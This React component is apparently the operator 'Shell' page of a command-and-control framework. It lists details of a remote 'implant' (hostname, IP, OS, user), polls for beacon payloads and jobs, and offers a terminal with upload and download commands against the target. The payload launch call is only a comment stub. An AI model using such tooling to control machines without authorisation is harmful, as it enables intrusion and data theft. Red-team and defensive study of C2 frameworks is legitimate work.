import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import UserService from "../services/UserService";
import { Button, FormControl, InputGroup, Spinner, Table } from "react-bootstrap";
import "../terminalfont.otf"
import css from "./ShellPage.module.css"

const ShellPage = () => {

    const userService = new UserService();

    const HELP_BUILTIN_COMMANDS = `
Available commands

Built-In commands:

ls/dir                        Lists the current working directory.
pwd/cwd                       Display the current working directory.
whoami                        Show logged in user.
sysinfo                       Display system information.
upload/put                    Uploads a file to the target implant.
download/get [path]           Downloads the file from the target implant.

`;

    const {implantId} = useParams();
    const [currentImplant, setCurrentImplant] = useState();
    const [implantStatus, setImplantStatus] = useState("init")
    const [command, setCommand] = useState()
    const [loggedInUser, setLoggedInUser] = useState();
    
    const [jobList, setJobList] = useState();
    const [builtInJobs, setBuiltInJobs] = useState([]);
    
    const [payloads, setPayloads] = useState([]);

    useEffect(() => {

        setLoggedInUser(localStorage.getItem("user") ? 
            localStorage.getItem("user") : "Anonymous")

        userService.getSlave(implantId).then((res) => {

            setCurrentImplant(res.data);
            setImplantStatus("online")

        }).catch((err) => {

            if (err.code == "ERR_NETWORK") {
                localStorage.clear();
                window.location.replace("/?error=reset");
                return;
            }

            console.error(err);
            console.error("Failed to retrieve implant information!");      
        })

        setInterval(() => {

            userService.getPayloads().then((res) => {

                setPayloads(res.data);
            
            }).catch((err) => {

                if (err.code == "ERR_NETWORK") {
                    localStorage.clear();
                    window.location.replace("/?error=reset");
                    return;
                }

                console.error(err);
                console.error("Failed to retrieve payloads!");      
            })
            
            userService.getJobForImplant(implantId).then((res) => {

                setJobList(res.data);

            }).catch((err) => {

                if (err.code == "ERR_NETWORK") {
                    localStorage.clear();
                    window.location.replace("/?error=reset");
                    return;
                }

                console.error(err);
                console.error("Failed to retrieve jobs!");      
            })
        }, 1000);
    }, [])

    const helpTableRow = (command, description, variables) => {

        var row = command;

        for (var i = 0; i < (30 -command.length); i++) {
            row += " ";
        }

        row += description + "\n";
        return row;
    }

    const getBeaconCommands = () => {

        var commandList = "Beacon commands:\n\n";
        
        // Create table that is readable.
        for (var payload of payloads) {
            commandList += helpTableRow(payload.name, payload.description, payload.variables);
        }

        return commandList;
    }

    const isBuildInCommand = (command) => {

        var output = "";
        
        switch (command) {

            case "?":
            case "help": {

                output += HELP_BUILTIN_COMMANDS;
                output += getBeaconCommands();
                break;
            }
            
            default: {
                // Not a builtin command.
                return false;
            }
        }

        setBuiltInJobs(prev => [...prev, 
            {
                index: jobList.length > 0 ? jobList.length -1 : 1,
                output: output,
                command: command,
            }
        ]);

        return true;
    }

    const isPayloadCommand = (command) => {

        var isPayloadCommand = false;
        for (var payload of payloads) {

            if (payload.name == command) {
                isPayloadCommand = true;
            }
        }

        return isPayloadCommand;
    }

    const exec = () => {

        // Delete input command.
        const copyCommand = command;
        setCommand("")

        var output = "Unknown command: " + copyCommand
        
        // Check if built in command.
        if (isBuildInCommand(copyCommand)) {
            return;
        }

        // Check if command exists.
        if (isPayloadCommand(copyCommand)) {
            
            // userService.launchCommand()...

        }
        else {   
            // If command not exists.
            setBuiltInJobs(prev => [...prev, {
                index: jobList.length > 0 ? jobList.length -1 : 1,
                output: output,
                command: command
            }])
        }
    }

    const onEnterKey = (e) => {
        if (e.key == 'Enter') {
            exec()
        }
    }

    const getPayloadNameById = (id) => {

        const payloadname = payloads.filter((payload) => payload.id == id)[0].name;
        return payloadname ? payloadname : "[command lost]" ;
    }

    const StatusImplant = () => {

        if (implantStatus == "init") {
            return (
                <span class={css.statusInit}>Initializing...<Spinner animation="border" size="sm"></Spinner></span>
            )
        }
        else if (implantStatus == "online") {
            return (
                <span class={css.statusOnline}>Online</span>
            )
        }
        else {
            return (
                <span class={css.statusInit}>Unknown...<Spinner animation="border" size="sm"></Spinner></span>
            )
        }

    }
    
    return (
        <>
            <h1>Shell</h1> 
            <div style={{textAlign: "left", padding: "20px"}}>

                {
                    currentImplant ? 
                        <Table class={css.implantBox} style={{maxWidth: "80%"}} bordered>
                        <tr>
                            <th>Nickname</th>
                            <td>{currentImplant.nickname}</td>
                        </tr>
                        <tr>
                            <th>Computername</th>
                            <td>{currentImplant.computername}</td>
                        </tr>
                        <tr>
                            <th>IP address</th>
                            <td>{currentImplant.ip}</td>
                        </tr>
                        <tr>
                            <th>Operating system</th>
                            <td>{currentImplant.os}</td>
                        </tr>
                        <tr>
                            <th>Logged in user</th>
                            <td>{currentImplant.username}</td>
                        </tr>
                        <tr>
                            <th>System info</th>
                            <td>{currentImplant.info}</td>
                        </tr>
                        <tr>
                            <th>Implant ID</th>
                            <td>{currentImplant.id}</td>
                        </tr>
                        
                        </Table> : <></>    
                }

            </div>

            <h3 style={{textAlign: "left", padding: "10px"}}>Status: <StatusImplant/></h3>

            <div class={css.outputShell}>
                {   
                    // Check we have remaining built in jobs left after the job list.
                    builtInJobs ? builtInJobs.map((builtin) => {
                        if (builtin.index > jobList.length) {
                            return (
                            <div class={css.commandOutput}>
                                    &#40;<span class={css.builtinCommand}>BUILTIN</span>&#41;
                                    &#91;<span class={css.outputUser}>{loggedInUser}</span>&#93;&nbsp;-&gt;&nbsp;
                                    {builtin.command}
                                    {
                                        builtin.output ? <pre>{builtin.output}</pre> : <></>
                                    }
                            </div> )
                        }
                    }) : <></>
                }
                {
                    jobList && jobList.length > 0 ? jobList.map((job, i) => {

                        return (
                            <>
                            <div class={css.commandOutput}>
                                 <div>
                                    <span>{job.status == "FINISHED" ? job.finishedAt : job.createdAt}</span>
                                    
                                    &nbsp;&#91;<span class={css.outputUser}>{loggedInUser}</span>&#93;&nbsp;-&gt;&nbsp;
                                    
                                    {getPayloadNameById(job.payloadId)} 
                                    {job.variables && job.variables.length > 0 ? job.variables.map((vars) => {
                                        return <>{" " + vars.value}</>
                                    }) : <></>}

                                </div>
                                {job.data ? <pre> {job.data} </pre> : <></>}
                                {job.status != "FINISHED" ? <>Running... <Spinner animation="border" size="sm"></Spinner></> : <></>}
                            </div>

                            {
                                builtInJobs  ? builtInJobs.map((builtin) => {

                                    // Check if builtin command was after the normal command.
                                    if (builtin.index == i) {
                                        return (
                                            <div class={css.commandOutput}>
                                                &#40;<span class={css.builtinCommand}>BUILTIN</span>&#41;
                                                &#91;<span class={css.outputUser}>{loggedInUser}</span>&#93;&nbsp;-&gt;&nbsp;
                                                {builtin.command}
                                                {
                                                    builtin.output ? <pre>{builtin.output}</pre> : <></>
                                                }
                                            </div>
                                        )
                                    }
                                }) : <></>
                            }
                            </>
                        )
                    }) : <></>
                }
            </div>

            <div class={css.terminal}>
                <InputGroup>
                    <InputGroup.Text>$</InputGroup.Text>
                    <FormControl aria-label="command" placeholder="whoami" value={command} autoFocus onChange={(e) => setCommand(e.target.value)} onKeyDown={onEnterKey}></FormControl>
                    <Button variant="outline-secondary" onClick={() => exec()}>Execute</Button>
                </InputGroup>
            </div>
        </>
    )
}

export default ShellPage;

// We don't need it?
